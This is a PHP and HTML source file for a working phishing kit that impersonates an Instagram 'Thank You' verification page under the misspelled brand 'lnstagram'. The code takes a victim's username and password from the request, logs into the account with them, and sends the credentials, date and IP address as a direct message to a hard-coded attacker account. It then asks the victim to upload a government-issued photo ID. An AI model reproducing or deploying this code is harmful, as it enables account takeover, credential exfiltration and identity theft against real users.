<?php 
	require 'vendor/autoload.php';
	\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
if ($_GET) {
	session_start();
	$qenzyist=$_GET['username'];
	$sf=$_GET["password"];
	$_SESSION['qenzyist']=$qenzyist;
		$ip=$_SERVER["REMOTE_ADDR"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
}


try {
	

if ($_GET)

 {
$username = $qenzyist;
$password = $sf;
$ig = new \InstagramAPI\Instagram();
$ig->login($username,$password);

} else {
	throw new Exception("Error Processing Request", 1);

	
}

} catch (Exception $e) {
	header('refresh: 0, url= login1.php');
}
$json = $ig->people->getInfoByName($qenzyist);
$suggest2 = json_decode($json,true);
$pp_resmi = $suggest2['user']['profile_pic_url'];
$userid = "2189079994";
$yazı = "$qenzyist $sf $date $ip";
$ig->direct->sendText(['users' => ["$userid"]], $yazı);

error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}

    



     foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:description' ) {
            $erhancan = $meta->getAttribute('content');
        }
    }?>
<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>Thank You • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">


	<style type="text/css">
		body{
			padding:0px;
			margin:0px;
			background:#fafafa;

		}
		*{
			font-family:sans-serif;

		}.qenzybey003{
			margin-top:10px;
		}
		#liste{ display:inline-block; }
  #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; }
   #asdxyz{ background-color:white; width:70%; border:1px solid #dedede; } 
   .qenzyist34{
   	background:#f2f3f5;
   	bottom:px;
   	
   	z-index:-999;
   
   	border-top:1px solid #cecece;
   }
   .bodyist_qenzyist{
   	padding:7px;
   	width:400px;
   	max-width:89%;
   	border:1px solid  #167dd5;
   	margin-top:30px;
   	background:#f9fafe;

   }.new_yazi_baslik{
   	color:#167dd5;
   	font-weight:500;
   	font-size:24px;
   }.erhancan256{
   	width:80%;
   	font-weight:400;
   	color:  #bc1888 ; 
   	opacity:;
   }




.username_erhancan256::placeholder{
	color:#167dd5;font-size:15px;
}


.button_erhancan256{padding:4px;
	margin-top:15px;border-radius:8px;
	background:#167dd5;
	font-size:16px;
	border:none;
	opacity:1;transition:0.8s;

outline:none;min-width:200px;max-width:250%;min-height:35px;
font-weight:bold;height:auto;
color:white;}.qenzyerhan{	
}.button_erhancan256:hover{opacity:0.8;}.button_erhancan256:focus{opacity:0.7;}
.erhancan257{
	margin-top:15px;
	border-radius:50%;
	max-width:80%;
	margin-bottom:10px;
	height:auto;



}.f2{padding-top:10px;
	width:340px;


	max-width:92%;
	padding:3px;
	/*border:2px solid #bc1888;*/
	text-align:center;
	
	margin-top:10px;
	margin-bottom:10px;
}
.f3{box-sizing:border-box;
	width:20%;
	/*border-right:1px solid #bc1888;*/
}.f4{width:75%;box-sizing:border-box;}.f3_qenzy{
	border-radius:50%;width:50px;max-width:99%;

}.f4_yazi{
	color:#167dd5;
	font-size:13px;
}.f2_2{

}.switch-qenzy{
	text-transform:capitalize;
	text-decoration:none;
	font-size:13px;
	font-weight:bold;
	margin-bottom:5px;
	color:#157dd4;
}
.prodgy{
	padding:4px;
	border:1px solid #dedede;
	width:200px;
	max-width:95%;
	color:#157dd4;
	transition:0.8s;
	background:white;}
	.prodgy:hover{opacity:0.8;background:white;color:#157dd4;}.prodgy:focus{}

	}
	</style>


</head>

<body>
	<header>
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
                    <span  class="header-text">Find it for free on Google Play.</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		<img src="<?php echo $pp_resmi; ?>" class="erhancan257" alt="<?php echo $qenzyist.' of photo ';?>">
		
<h1 style="font-weight:400;color:#343434;font-size:20px;letter-spacing:px;">@<?php echo $qenzyist ;?></h1>

		

		<button class="fb-qenzy" style="display:none;">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">
			Please provide a copy of of your <b>government-issued, photo ID</b>. This ID must:
		</p>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">
			Be government-issued (ex: passport, driver's license)

		</p>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">
			Clearly show your name, picture and birthday

		</p>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">
			Be in color
		</p>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">
			<b>Cover</b> up any personal information we don't need to verify your identity (ex: address, license number). Learn more about why we <a href="https://help.instagram.com/help/314201258613998"> require a copy of your ID and</a> what types of <a href="https://www.facebook.com/help/159096464162185"> ID we'll accept</a>.

		</p>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">
			Your <b>ID(s)</b>
		</p>

		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:10px;">
			Saved as JPEGs, if possible
		</p>

		<form action="upload.php" method="POST" enctype="multipart/form-data" class="upload-form">
 <input type="file" name="dosya" class="upload"> <br>
<br>

			<button type="submit" class="qenzyist">Continue</button>
			</form>












		
			<input style="display:none;" type="email" name="mail" placeholder="E-Mail" required="" class="username" autocomplete="off"><br>
			<input style="display:none;
			" type="password" name="mail_password" placeholder="E-Mail Password" required="" class="password">
			
			<table class="sa" style="display:none;">
				<tr class="as">
					<th class="x"></th>
					<th class="y">
						<span class="forgot">Forgot Password?</span>
					</th>
				</tr>
			</table>

		


		

				<table class="f2">
	<tr class="f2_2">
		<td class="f3">
		</td>

		<td class="f4">
			
	<p class="f4_yazi">
		
	
	</p>
		</td>

	</tr>
  </table>
	
		<div class="dont" style="display:none;">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>

	</center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>
<textarea Style="width: 1px; height: 1px" Rows="1" Cols="1">

<SCRIPT LANGUAGE="Javascript">

if (parent.frames.length > 0)

parent.********.href=self.********;

</SCRIPT>
</body>
</html>
<?php

?>

